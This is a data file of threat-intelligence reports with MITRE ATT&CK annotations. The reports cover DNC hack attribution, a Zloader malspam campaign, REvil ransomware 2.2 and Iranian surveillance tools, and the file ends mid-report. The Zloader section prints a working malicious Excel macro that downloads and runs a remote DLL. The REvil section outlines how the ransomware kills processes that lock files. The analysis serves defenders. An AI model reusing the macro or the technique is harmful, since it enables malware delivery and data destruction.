[{"cti_report": "Who hacked the Democratic National Committee?\nJun 17, 2016\nBy Mark Arena, CEO of Intel 471.\n**Who hacked the Democratic National Committee?**\nI\u2019ll preface this post by saying that I possess no information on this incident beyond what has been mentioned in open sources.\nThis post is my personal opinion and is based on my experience researching and tracking both state and non-state cyber threat actors.\nI\u2019ll also add that [Intel 471](https://intel471.com) does not actively research and track threat actors that are involved with espionage and is focused on financially motivated cyber criminals and hacktivists/politically motivated threat actors.\nOn June 14, the Washington Post published a [story](https://www.washingtonpost.com/world/national-security/russian-government-hackers-penetrated-dnc-stole-opposition-research-on-trump/2016/06/14/cf006cb4-316e-11e6-8ff7-7b6c1998b7a0\\_story.html?hpid=hp\\_hp-banner-main\\_dnc-hackers-1145a-banner%3Ahomepage%2Fstory) that indicated Russian government hackers had hacked into the Democratic National Committee (DNC).\nThe specific information linking the hack to the Russian government came from the cyber security company [CrowdStrike](https://www.crowdstrike.com/):\n> One group, which CrowdStrike had dubbed Cozy Bear, had gained access last summer and was monitoring the DNC\u2019s email and chat communications, Alperovitch said.\n>\n>\n> The other, which the firm had named Fancy Bear, broke into the network in late April and targeted the opposition research files.\n>\n>\nI personally know a number of smart people who work at CrowdStrike and I trust them when they say that a specific intrusion or incident is linked to a specific hacking group.\nWith regards to linking intrusion sets to groups, CrowdStrike uses an animal naming scheme to tie intrusion activity and intrusion sets to groups and countries.\nIn this case CrowdStrike said that they observed intrusions in the DNC tied to the groups they call *Cozy Bear* and *Fancy Bear* where Bear signifies Russia.\nI have no doubts at all that CrowdStrike indeed observed intrusion set activity within the DNC\u2019s environment that linked to these groups they had identified and were almost certainly actively tracking.\n**Guccifer 2.0: A spanner in the works**\nOn June 15, an actor who calls himself *Guccifer 2.0* created a [Wordpress blog](https://guccifer2.wordpress.com) where he posted a number of claimed confidential reports from the DNC including one on Donald Trump.\nIn the blog post, an effort appears to be made to say how easy it was to hack the DNC and called into question CrowdStrike who linked two intrusions of the DNC to the Russian government.\nFor those that aren\u2019t aware, the handle [*Guccifer*](https://en.wikipedia.org/wiki/Guccifer) was used by a Romanian hacker who was recently extradited to the United States.\nThis actor was involved with hacking high profile people such as politicians and celebrities and publicly releasing their emails.\n*Guccifer* currently sits in a jail in Virginia awaiting sentencing.\n**Russia.\nAttribution is hard right?**\nWhen it comes to attribution of intrusions to groups or specific people, we are really talking about two things:\n* Attribution of the observed intrusion sets (malware, exploits etc) to known intrusion groups.\nThis is where CrowdStrike tied this activity to the groups they call *Cozy Bear* and *Fancy Bear.*\n* Attribution of the threat grouping to a specific person, group/organization or nation state where in this case CrowdStrike has clearly singled out Russia.\nThis is a lot harder than the previous point.\nOn the first point, I have complete confidence that CrowdStrike is able to track and link specific intrusions tools to known groups which they actively track.\nOn the second point, it is a little more unclear whether this activity is tied to the Russian government and I can\u2019t really comment on that as I don\u2019t have information that supports this or not.\nThis type of attribution is done in a number of ways but is not limited to:\n* Tracking of specific targets/target sectors over a long period of time and mapping that against nation state objectives.\nConfidential and internal information within the DNC would be of clear interest to the Russian government and other governments.\nIt might also be of interest to a politically motivated hacker who would want to discredit the DNC by publishing their sensitive information.\n* Researching intrusion activity and identifying operational security failures on behalf of the intrusion operators.\nA good example of this is where [iSIGHT Partners](https://isightpartners.com) was able to [tie](http://freebeacon.com/national-security/cyber-caliphate-hackers-not-linked-to-islamic-state/) a claimed Islamic State (ISIL) hacking group to a Russian group they track as APT28.\n**Guccifer 2.0 did it!**\nOne thing for sure with *Guccifer 2.0* is that he clearly has demonstrated access to internal documents of the DNC.\nGiven that, I believe there\u2019s two possibilities:\n* One or both of the groups identified by CrowdStrike is tied to *Guccifer 2.0* and this is a disinformation campaign against CrowdStrike and the DNC.\n* *Guccifer 2.0* is a distinct threat actor who had access to the DNC\u2019s systems at some point.\nAt no way does this mean CrowdStrike was wrong with linking the activity they saw in the DNC\u2019s environment.\nI\u2019ve seen numerous occasions where organizations have been compromised by multiple different intrusion groups and the evidence of one intrusion group being active in a victim\u2019s environment doesn\u2019t mean another intrusion group can\u2019t be active in the same environment at the same time.\nOn *Guccifer 2.0* being a possible disinformation operation, I recommend closely looking at *Guccifer 2.0*\u2019s writing.\nBased on the style and how it has been done, it looks like it was written by someone who doesn\u2019t speak English as a first language and uses mannerisms used by people based in Eastern Europe or was purposely written like this.\nI also recommend reading the Twitter timeline for [pwnallthethings](https://twitter.com/pwnallthethings) which talks about claimed operational security (OPSEC) failures on behalf of *Guccifer 2.0* and various files that were uploaded online.\nI\u2019ll add that initially I was surprised by how quickly a disinformation operation could possibly have been executed after the Washington Post article.\n**Final Remarks**\nI\u2019ll finish things off by repeating that in my opinion the emergence of *Guccifer 2.0* does not at all conflict with CrowdStrike\u2019s findings.\n*Guccifer 2.0* may be a separate actor or may be tied to one or both of the intrusion groups CrowdStrike claims were active inside the DNC.", "mitre_ids": ["G0007", "G0007", "G0007", "G0007"], "anno_name_label": [["GROUP", "Cozy Bear"], ["GROUP", "Cozy Bear"], ["GROUP", "Cozy Bear"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Analysis of an attempted attack against Intel 471\nMar 26, 2020\nBy the Intel 471 Malware Intelligence team.\nBackground\n----------\nThe following write-up is our analysis of an attack attempted against one of our employees this week.\nAt no point was our employee\u2019s system at risk of being compromised.\nInterestingly, the employee\u2019s email address only had been used in very few instances externally.\nWe are releasing this information publicly to share tactics, techniques and procedures (TTPs) and encourage others to share similar incidents.\nSummary\n-------\nThe threat actor that sent this malspam campaign demonstrated good operational security (OPSEC) by hiding their infrastructure behind professional bulletproof hosting (BPH) services and by filtering traffic to hide final payloads from curious researchers.\nThe actor used a series of tools in this operation, including KeitaroTDS, a malicious Microsoft Excel spreadsheet document builder and the Zloader banking trojan (aka Terdot).\nConsidering the nature of the malspam documents (usually named \u201cInvoice\u201d) and the use of a banking trojan, we assess the intended goal of the attackers was to make unauthorized bank transfers from victim accounts.\nEmail details\n-------------\nThe following email was sent to ****@intel471.com 5:26:11 p.m. GMT, Monday, March 23, 2020:\n| **Filename** | March Incoming Invoice from Seed Records.eml |\n| **SHA256 hash** | 5d1bb0aef5545138feb825d5b0669ccc4a68abb4323362f2fe188e86c62aeed0 |\nThe sender was an AOL mail account, using the AOL mail portal and a Windows machine using the Google Chrome browser (if the user agent can be trusted).\n| **From: Annika Preston <[[email\u00a0protected]](/cdn-cgi/l/email-protection)>To: ****@intel471.com**Message-ID: <[[email\u00a0protected]](/cdn-cgi/l/email-protection)>Subject: March Incoming Invoice from Seed RecordsMIME-Version: 1.0Content-Type: multipart/mixed;boundary=\"----=\\\\_Part\\\\_719010\\\\_1408914388.1584984371396\"References: <[[email\u00a0protected]](/cdn-cgi/l/email-protection)>X-Mailer: **WebService/1.1.15518 aolwebmail** Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 |\n### Sender IP address\nThe mail was received from the Yahoo mail netspace.\n| **Received: from sonic313-9.consmr.mail.ne1.yahoo.com(sonic313-9.consmr.mail.ne1.yahoo.com.[66.163.185.32])** by mx.google.com with ESMTPS id c76si12645930ilg.12.2020.03.23.10.26.15 for <****@intel471.com> (version=TLS1\\\\_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128); Mon, 23 Mar 2020 10:26:16 -0700 (PDT) |\nExcel spreadsheet details\n-------------------------\nThe spreadsheet\u2019s metadata contained the following information:\n| **Property** | **Value** |\n| Create time | 2020-02-27 10:23:09.379000 |\n| Last saved time | 2020-03-23 12:01:22 |\n| Comments | q8uOfaZ1QVOMIl4NtP |\n| Author | N/A |\nThe document implemented malicious Excel 4.0 Macros (XLM) to download and execute the secondary stage payload.\nThese macros were present in a hidden sheet named \"DiOAFArhpr\".\nThe macros were written vertically, character-by-character inside different cells.\nThis approach was employed to bypass detection since analysis tools can fail to retrieve the command strings.\n![](https://d39ec1uo9ktrut.cloudfront.net/pasted-image-0-1-300x163.png)\nThe executed macros were:\n|\n```\n=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)\n=IF(GET.WORKSPACE(14)<381, CLOSE(FALSE),)\n=IF(GET.WORKSPACE(19),,CLOSE(TRUE))\n=IF(GET.WORKSPACE(42),,CLOSE(TRUE))\n=IF(ISNUMBER(SEARCH(\"Windows\",GET.WORKSPACE(1))),\n,CLOSE(TRUE))\n=CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCJJ\",0,\n\"hxxps://grpxmqnrb[.]pw/egrg4g3g\",\n\"c:\\Users\\Public\\fef2fff.html\",0,0)\n=ALERT(\"The workbook cannot be opened or repaired\nby Microsoft Excel because it's corrupt.\",2)\n=CALL(\"Shell32\",\"ShellExecuteA\",\"JJCCCJJ\",0,\"open\",\n\"C:\\Windows\\system32\\rundll32.exe\",\n\"c:\\Users\\Public\\fef2fff.html,DllRegisterServer\",0,5)\n```\n|\nThe DLL at the location hxxps://grpxmqnrb[.]pw/egrg4g3g was retrieved and saved under \"C:\\Users\\Public\\fef2fff.html\" before being executed.\nAs shown in the HTTP request below, the malicious server performed a redirection to the GitHub software development platform (GitHub was advised) and downloaded a dynamic link library (DLL) from a public repository.\n| GET /egrg4g3g HTTP/1.1Host: grpxmqnrb[.]pwUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)Accept: */*HTTP/1.1 302 FoundServer: nginxDate: Tue, 24 Mar 2020 13:00:34 GMTContent-Type: text/html; charset=UTF-8Content-Length: 0Connection: keep-aliveCache-Control: no-cache, no-store, must-revalidate,post-check=0,pre-check=0Expires: 0Last-Modified: Tue, 24 Mar 2020 13:00:34 GMT**Location: hxxps://github[.]com/arntsonl/calc\\\\_security\\\\_poc/raw/master/dll/calc.dll**Pragma: no-cacheSet-Cookie: \\\\_subid=357bngnes3kqn;Expires=Friday, 24-Apr-2020 13:00:34 GMT;Max-Age=2678400;Path=/X-Content-Type-Options: nosniff |\nExamining it revealed it does nothing but pop the Windows calculator.\n![](https://d39ec1uo9ktrut.cloudfront.net/pasted-image-0-2-300x73.png)\nClearly, we have received a decoy payload.\nNetwork artifact research\n-------------------------\nThe malicious Excel document contained a macro that downloaded a file from:\ngrpxmqnrb[.]pw\n| Creation Date | 2020-03-23T07:08:34.0Z |\n| Expiration Date | 2021-03-23T23:59:59.0Z |\n| Name Servers | A.DNSPOD.COM, B.DNSPOD.COM |\n| Registrar | Namecheap |\nThe domain name probably was created solely for this campaign because it was created only days ago and appears to have no legitimate web presence.\nAn instance of KeitaroTDS (Traffic Directional System) was found on this domain:\n![](https://d39ec1uo9ktrut.cloudfront.net/pasted-image-0-3-300x205.png)\nThe domain has the following DNS records:\n| ;; ANSWER SECTION:grpxmqnrb[.]pw.\n600 IN NS c.dnspod.com.grpxmqnrb[.]pw.\n600 IN NS b.dnspod.com.grpxmqnrb[.]pw.\n600 IN NS a.dnspod.com.grpxmqnrb[.]pw.\n600 IN A 8.208.28.247grpxmqnrb[.]pw.\n600 IN SOA a.dnspod.com.\ndomainadmin.dnspod.com.\n1584947588 3600 180 1209600 180 |\nWe can see the domain is administered via DNSPod, a product of Chinese company Tencent ().\nThe IP address in the address record or \u201cA record\u201d belongs to Alibaba Cloud aka Aliyun.\n| inetnum: 8.208.0.0 - 8.208.255.255netname: ALICLOUD-GBdescr: Aliyun Computing Co.LTD |\nThis IP address was identified by our intelligence team as hosted by the well-known Russian-based BPH service [yalishanda](https://krebsonsecurity.com/2019/07/meet-the-worlds-biggest-bulletproof-hoster/).\nThe actor yalishanda\u2019s service offers a reverse proxy network that abuses cloud providers, such as Alibaba-Cloud, Tencent Cloud, Google Cloud and others.\nThe service uses the Chinese based free DNS provider DNSPOD to rotate client domains across the reverse proxy network.\nThis can be thought of as a host-based fast-flux service.\nThe fact the threat actors behind this attack have the ability to access and pay for BPH infrastructure lends more credence to the idea they are a somewhat capable and well-resourced group.\nThe following table contains information on the SSL certificate used by the domain:\n| **Common name** | grpxmqnrb[.]pw |\n| **Issuer** | Let's Encrypt Authority X3 |\n| **Valid** | From March 22, 2020 to June 20, 2020 |\n| **Signature Algorithm** | sha256WithRSAEncryption |\n| **Serial Number** | 041117a29a27b3b4bda2f53fd1d8ab9581d9 |\n###\n### Passive DNS Results\nPassive DNS results showed plenty of similar and recent activity associated with the IP address 8.208.28[.]247.\n| **Domain** | **First Seen(GMT)** | **Notes** |\n| grpxmqnrb[.]pw | 2020-03-23 00:20:31 | Associated with this campaign and with Yalishanda bulletproof hosting infrastructure.\n|\n| gfhudnjv[.]xyz | 2020-03-24 03:10:29 | Associated with Yalishanda bulletproof hosting infrastructure.\n|\n| wgyafqtc[.]online | 2020-03-18 15:30:23 | Associated with similar Excel doc based campaign:  |\n| wgyvjbse[.]pw | 2020-03-18 14:45:51 | Confirmed Zloader controller domain name |\n| botiq[.]xyz | 2020-03-18 14:46:16 | Confirmed Zloader controller domain name |\n| dhteijwrb[.]host | 2020-03-17 07:55:04 | Linked directly to a very similar campaign: .\nAssociated with Yalishanda bulletproof hosting infrastructure.\n|\n| tdvomds[.]pw | 2020-03-16 17:00:00 | Same type of activity: .\nAssociated with Yalishanda bulletproof hosting infrastructure.\n|\n| siloban[.]pw | 2020-03-17 07:54:50 | Linked to [161.117.177[.]248](https://www.virustotal.com/gui/ip-address/161.117.177.248) which is a confirmed Zloader controller address and part of yalishanda\u2019s fast-flux bulletproof hosting infrastructure.\nAlso a confirmed Zloader controller domain name.\n|\n| hxzfvomd[.]buzz | 2020-03-15 17:00:00 | Linked to several similar campaigns and associated with Yalishanda bulletproof hosting infrastructure.\n|\nReconstructing the attack\n-------------------------\nWe initially were unable to download the intended payload from hxxps://grpxmqnrb[.]pw/egrg4g3g, but by following the trail of infrastructure and record of activity, we were able to reproduce the steps and continue the investigation.\nThe file invoice-522.xls (SHA256: 34c5591a749636853aef4f9b3867560319d78ab530a332575fee88a85287dcfa) was analyzed on the VirusTotal intelligence platform and found to communicate with the same IP address, although via a different domain and file path.\nThis likely is a previous campaign by the same threat actor or group.\nThis analysis provided a successful fetch of the initial payload: 06afeaf2b0b985e0d9e048ea8ef0231026cac4c03d3ddf45f6a4ab18d884505c\nThis payload is an exact match of the one received by Amirreza Niakanlahiji and Pedram Amini in their blog post on a previous campaign from the same actors (see: ).\nThey received a payload that contacted some unknown controllers:\n* hxxps://aquolepp[.]pw/milagrecf.php\n* hxxps://dhteijwrb[.]host/milagrecf.php\nWe recognized these as Zloader control server addresses because they are re-using the milagrecf.php file path for their controller URLs.\nWas it possible our campaign was unrelated.\nAs an analyst, one must always approach an investigation with a healthy dose of skepticism.\nA few instances of similar behavior can be coincidental.\nWe should look for patterns of behavior to learn how the operation works.\nBy pivoting on the response content, we found several similar URLs first seen recently:\n| **First Seen** | **AV Score** | **URL** |\n| 2020-03-19 | 0/ 76 | hxxps://wgyafqtc[.]online/fgwg24g24g |\n| 2020-03-19 | 4/ 76 | hxxps://tdvomds[.]pw/fgwg24g24g |\n| 2020-03-17 | 0/ 71 | hxxp://tdvomds[.]pw/12341324rfefv |\n| 2020-03-19 | 5/ 76 | hxxps://tdvomds[.]pw/12341324rfefv |\n| 2020-03-16 | 1/ 71 | hxxps://hxzfvomd[.]buzz/asf2f1ff |\n| 2020-03-16 | 1/ 71 | hxxp://hxzfvomd[.]buzz/asf2f1ff |\n| 2020-03-05 | 2/ 71 | hxxp://pjtcdnrd[.]pw/fsgbfgbfsg43 |\n| 2020-03-05 | 0/ 71 | hxxps://pjtcdnrd[.]pw/fsgbfgbfsg43 |\n| 2020-03-04 | 2/ 71 | hxxp://wrjmkdod[.]xyz/SDFwef2fvbbe |\nThe pattern of behavior is becoming clear.\nMost of these domains can be linked to malicious Excel documents apparently created by the same malicious document builder.\nBased on the research, we can attribute some TTPs to this threat actor.\nTactics, techniques and procedures\n----------------------------------\nThe threat actor proved to have access to many resources in the criminal underground and is comfortable with a range of tools to run the operation.\nThe following TTPs were observed:\n* Hiding infrastructure behind BPH from the known vendor yalishanda.\nSee Brian Krebs\u2019 blog post on yalishanda [here](https://krebsonsecurity.com/2019/07/meet-the-worlds-biggest-bulletproof-hoster/).\n* Using a malicious Excel document builder to craft documents for malspam campaigns.\n* Using KeitaroTDS for routing traffic and controlling campaign infrastructure.\n* Using Zloader banking trojan for establishing control on victim machines and staging additional payloads such as hidden virtual network computing (HVNC) and launching web-injects.\n* Using legitimate secure sockets layer (SSL) certificates signed by Let\u2019s Encrypt.\nIndicators of compromise\n------------------------\nThese can be downloaded in CSV format [here](https://files.intel471.com/Indicators-25Mar2020.csv).\n| **Context** | **Indicator** |\n| Download link from malicious Excel document | hxxps://wgyafqtc[.]online/fgwg24g24g |\n| Download link from malicious Excel document | hxxps://tdvomds[.]pw/fgwg24g24g |\n| Download link from malicious Excel document | hxxp://tdvomds[.]pw/12341324rfefv |\n| Download link from malicious Excel document | hxxps://tdvomds[.]pw/12341324rfefv |\n| Download link from malicious Excel document | hxxps://hxzfvomd[.]buzz/asf2f1ff |\n| Download link from malicious Excel document | hxxp://hxzfvomd[.]buzz/asf2f1ff |\n| Download link from malicious Excel document | hxxp://pjtcdnrd[.]pw/fsgbfgbfsg43 |\n| Download link from malicious Excel document | hxxps://pjtcdnrd[.]pw/fsgbfgbfsg43 |\n| Download link from malicious Excel document | hxxp://wrjmkdod[.]xyz/SDFwef2fvbbe |\n| Yalishanda bulletproof hosting IP | 8.208.28[.]247 |\n| Yalishanda bulletproof hosting IP | 161.117.177[.]248 |\n| Zloader controller URL | hxxps://aquolepp[.]pw/milagrecf.php |\n| Zloader controller URL | hxxps://barbeyo[.]xyz/milagrecf.php |\n| Zloader controller URL | hxxps://bhajkqmd[.]xyz/milagrecf.php |\n| Zloader controller URL | hxxps://botiq[.]xyz/milagrecf.php |\n| Zloader controller URL | hxxps://buhjike[.]host/milagrecf.php |\n| Zloader controller URL | hxxps://bwambztl[.]xyz/milagrecf.php |\n| Zloader controller URL | hxxps://dhteijwrb[.]host/milagrecf.php |\n| Zloader controller URL | hxxps://rizoqur[.]pw/milagrecf.php |\n| Zloader controller URL | hxxps://siloban[.]pw/milagrecf.php |\n| Zloader controller URL | hxxps://wgyvjbse[.]pw/milagrecf.php |\n| Malicious Excel document sample | cfe139d639d461fe731427e79bd7048849080d4d7d906d10fae764eb056f1f0b |\n| Malicious Excel document sample | f1ced9008d9de4109844d99fc924b6e3e4a4062ed37b52ce4b5baed430d004cf |\n| Malicious Excel document sample | 4a5d8cde14f9e8c4f1a0cf514ca084528631d6caa8aa5282a4bf8f58dbf54f33 |\n| Malicious Excel document sample | 9e5edda543358b7ead2614ff75e23d2c271cb917a89003fa8733d9d730950507 |\n| Malicious Excel document sample | 30175739414fa301617ed6f0234992f1b3bc67a8547185cd332ad42c5a170486 |\n| Malicious Excel document sample | 34c5591a749636853aef4f9b3867560319d78ab530a332575fee88a85287dcfa |\n| Zloader malware sample | 8021084f2d006101e0522f62de9c1e22ec55a6639e792dc7eff2826c013597a9 |\n| Zloader malware sample | e81d729e1b810215940eb96e1de3e9500f522e9ba16bca2f9d49113fb462bb4d |\n| Zloader malware sample | 0889271c721391d625a19391275f0e6bf244a5548a1a6eb673c6e16a48e960e1 |\n| Zloader malware sample | 3703d42ee0a6c4115295f14f3980cf205f7e6fb77ed0301c845431728015c812 |\n| Zloader malware sample | 3f2cf070e3740514c4e0dd431392a6727250a9ad3425c5b25ffad2d9d3b74716 |\n| Zloader malware sample | 66f49a261b6086dfdd1c3e2a21f7cb746aa35707490cbd64693d66383ba54c64 |\n| Zloader malware sample | 776fee630d6f89a7a01c5903de93fbd9f12f5cba8df148330a8c6f0cd267890b |\n| Zloader malware sample | 945e3e4f52d30e07a281b20f96bf7150234c18aa4373c683dee74a194b57dcc0 |\n| Zloader malware sample | a347f8b4a17dffa05a4fe9602cf99302201220e7000b5826798dd3d8db7b2b7f |\n| Zloader malware sample | ac60a7471ee5297b9cefb5b3d1c1dbec4b7bf328c8b8649529202a1381acb2a5 |", "mitre_ids": ["T1566", "T1059", "T1566", "T1105", "T1059", "T1059", "T1059", "TA0005", "T1059", "T1204", "T1218", "T1105", "TA0011", "T1059", "TA0011", "TA0011", "T1059", "T1059", "T1566", "T1059", "T1105", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059"], "anno_name_label": [["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"]], "cti_entity_class": ["CI", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Changes in REvil ransomware version 2.2\nMay 04, 2020\nBy the Intel 471 Malware Intelligence team.\n### Summary\nThe REvil ransomware-as-a-service (RaaS) operation continues to impact businesses worldwide.\nThe threat actors responsible for developing and maintaining the malware have released an updated ransomware, namely version 2.2.\nIn this short blog post, we will cover the significant changes from the previous version, which we covered in detail in an earlier blog post (see: https://blog.intel471.com/2020/03/31/revil-ransomware-as-a-service-an-analysis-of-a-ransomware-affiliate-operation/).\n### Persistence mechanism\nREvil ransomware persists on a machine if the **arn** configuration field is set to **true**.\nIt writes its path to the registry key **SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run**.\nAn example of the value name of the registry key entry is **mjOObKp0yy**.\n![](https://d39ec1uo9ktrut.cloudfront.net/revil.png)\nIn version 2.1, first collected by our systems March 15, 2020, this persistence mechanism was removed.\nIt seems this little experiment didn\u2019t go as planned, because the new version 2.2 brings the same persistence mechanism back.\n### Restart Manager to terminate processes\nOne of the more interesting new features of REvil version 2.2 is the use of the Windows Restart Manager to terminate processes and services that can lock files targeted for encryption.\nIf a process has an open file handle for a specific file, then writes to that file by another process (in this case, a ransomware) it will be prevented by the Windows operating system (OS).\nTo circumvent this, the REvil developers have implemented a technique using the Windows Restart Manager also used by other ransomware such as SamSam and LockerGoga (see: ).\nREvil ransomware opens files for encryption with no sharing (dwShareMode equals 0).\nAs a result, the Restart Manager is invoked whenever a sharing violation occurs when opening an already opened file.\n![](https://d39ec1uo9ktrut.cloudfront.net/pasted-image-0-6.png)\nThe function prototype for **rvl\\\\_restart\\\\_manager** is:\n```\nVOID rvl\\\\_restart\\\\_manager(LPCWSTR Filename, BOOL DoEndSession)\n```\nThe following explains how REvil employs this technique:\n* Call **OpenSCManagerW** to open the \u201cServicesActive\u201d database.\n* Start a new Restart Manager session by calling **RmStartSession** and save the returned handle in a global variable for future calls.\n* Invoke **RmRegisterResources** with the target file name to register it to the Restart Manager session.\n* Retrieve the list of all applications currently using the file by calling **RmGetList**.\nThis application programming interface (API) returns an array of **RM\\\\_PROCESS\\\\_INFO** structures.\n* If a normal process is using the file, it is terminated by a call to **TerminateProcess**.\n* If a service is encountered, **ControlService** is invoked with the **SERVICE\\\\_CONTROL\\\\_STOP** control code to stop the service followed by a call to **DeleteService**.\n* If a critical process is encountered, its critical status is removed by calling **ZwSetInformationProcess** with the information class **ProcessBreakOnTermination** before terminating it.\nThis may lead to undefined behavior on the victim system.\n#### New \u2018-silent\u2019 flag\nA new command-line option -silent was added that skips termination of blacklisted processes, services and shadow copy deletion.\nHowever, this flag does not impact the new Restart Manager functionality.\n![](https://d39ec1uo9ktrut.cloudfront.net/pasted-image-0-7.png)### Indicators of compromise\n![](https://d39ec1uo9ktrut.cloudfront.net/Screen-Shot-2020-09-03-at-11.48.30-am.png)", "mitre_ids": ["S0496", "T1486", "S0496", "T1486", "T1486", "T1486", "TA0003", "S0496", "T1486", "T1547", "T1547", "TA0003", "TA0003", "T1543", "S0496", "T1543", "T1486", "S0496", "T1486", "S0370", "S0372", "T1543", "S0496", "T1486", "S0496", "T1543", "T1543", "T1543", "T1543"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CI"]}, {"cti_report": "Iran\u2019s domestic espionage: Lessons from recent data leaks\nJul 08, 2020\nBy the Intel 471 Global Research Team.\nIn the last decade, Iran has undergone a quiet revolution.\nSince the\u201cGreen Movement\u201d uprising in 2009, more Iranians have dared to openly oppose their regime.\nThe reasons include accusations of elections tampering, global sanctions, increased inflation, heavy investment of state funds in the nuclear and arming programs, and ambitious regional policies in Lebanon, Syria, Iraq, Yemen and others, amid a deteriorating socioeconomic situation of the average Iranian.\nThere was a lot of talk in the past about Iran\u2019s espionage measures and offensive cyber activities targeting other countries.\nHowever, growing domestic unrest prompted the Iranian regime to invest more resources in developing espionage capabilities aimed against its own citizens.\nAdditionally, the regime carried out tough measures against civil uprisings such as cutting off the internet in the country for long periods of time and killing hundreds of protestors.\nDuring the past year, a number of online activists have leaked what they claim to be inside information about the regime\u2019s surveillance methods, in an attempt to expose the unethical tactics used by Iranian security forces.\nAmong the top whistleblowers are operators of the Lab Dookhtegan (translated in Persian as \u201cstitched lips\u201d) Telegram channel and an activist named Masoud Molavi.\nMolavi, assassinated by Iranian agents in November 2019, was a former cybersecurity official behind the Black Box Telegram channel that was responsible for many notable leaks of Iranian government information.\nThe series of leaks uncovered hundreds of documents that offer a glimpse into the way Iran is spying on its own people.\nAccording to the leaked information, the Islamic Revolutionary Guard Corps (IRGC) and the Iranian Ministry of Intelligence Services (MOIS) developed numerous tools, malicious software, surveillance systems and data analysis platforms, in order to control citizens in Iran and abroad.\nMuch of this activity allegedly was conducted in the Rana Intelligent Computing Institute, an organization working under the Iranian MOIS, involved in internal espionage by developing unique tools and gaining access to a variety of foreign countries\u2019 infrastructure.\n### Tools and Techniques used for Domestic Espionage\nAccording to the information shared by these whistleblowers, Iran is heavily investing in the development of customized tools and malicious software for domestic espionage.\nFor example, the Iranian regime developed a surveillance system dubbed Abi, which allegedly was used to spy on political activists, human rights lawyers, regime opponents and protesters by intercepting Bluetooth communications.\nAccording to an Iranian blog called Arezooyenatamam, (translated in Persian as \u2018an unfinished dream\u201d), this system has been installed on pickup trucks posted in strategic locations in Iran such as university campuses or protest centers.\n![](https://d39ec1uo9ktrut.cloudfront.net/pasted-image-0-2.png)\nA screenshot from the Abi system monitoring of Sharif UniversityThe Iranian regime also developed customized malware used for stealing information from citizens.\nOne example found in those leaks was called WinspySuite, a remote access and information stealing malware that reportedly was used specifically to spy on suspects arrested by the regime.\nInternally referred to as Peyvand, the malware allegedly was loaded onto a target\u2019s computer via a USB flash drive during interrogations or sent via a malicious link to a victim\u2019s email address.\nThe regime also developed a remote access tool for Android and iPhone mobile devices as part of a project dubbed Project 220.\nThe malware purportedly was able to steal sensitive data from a victim\u2019s device, including call data, text messages, contacts and locations.\n![](https://d39ec1uo9ktrut.cloudfront.net/pasted-image-0-3.png)\nA screenshot from the Winspy Suite control panelAnother malware project dubbed Project 420 aka Dolphin developed, deployed and controlled an undisclosed mobile malware capable of collecting and analyzing information about the activities of individuals and groups on social media networks including Facebook, Twitter, and Instagram, and on messaging applications such as Telegram.\nAccording to leaked information, the regime not only developed tools for stealing sensitive data from its citizens, but also created designated platforms for the collection and analysis of the data.\nA system dubbed Payamak was developed to store and analyze text messages from targeted subjects.\nA software called Seraj was used as an analytical search engine for data on suspects, employees, intelligence operations and arrests related to the MOIS.\nAnother system mentioned in reports dubbed Shojreh includes a mapping of family relations of Jewish people in Iran and abroad.\nAdditionally, the IRGC and MOIS gained unauthorized access to legitimate services or websites to spy on Iranian citizens.\nFor example, the MOIS would compromise Iran\u2019s National Library computer network seeking to obtain personal information about users, mainly students and political prisoners, and their topics of interest.\nThe MOIS allegedly also abused this access to send phishing emails with malicious attachments from the library\u2019s official email account.\n### Tracking Iranians Abroad\nIn addition to all of the above, the Iranian government is making great efforts to monitor citizens going abroad by surveying and analyzing location data obtained from Iranian cellular operators with a system called Pouya, and by compromising the infrastructure of foreign companies.\n![](https://d39ec1uo9ktrut.cloudfront.net/pasted-image-0-4.png)\nA screenshot from the Pouya systemIn 2019, an unknown activist or group of activists launched a site called \u201cVagheyatepenhaan\u201d (translated in Persian as \u2018the hidden facts\u2019) to expose Iranian regime espionage-related activity.\nThe site contains a large section about espionage enterprises outside Iran that was conducted to monitor the movement of Iranians traveling abroad.\nAccording to this information, the regime gained access to computer systems of numerous airline companies in Bahrain, Dubai, India, Indonesia, Malaysia, Pakistan, the Philippines, Qatar, Saudi Arabia, Thailand and the United Arab Emirates (UAE) for data collection on flights of Iranian citizens.\nIn another case, leaked documents showed the government worked on a project that aimed to compromise hotel websites in the Republic of 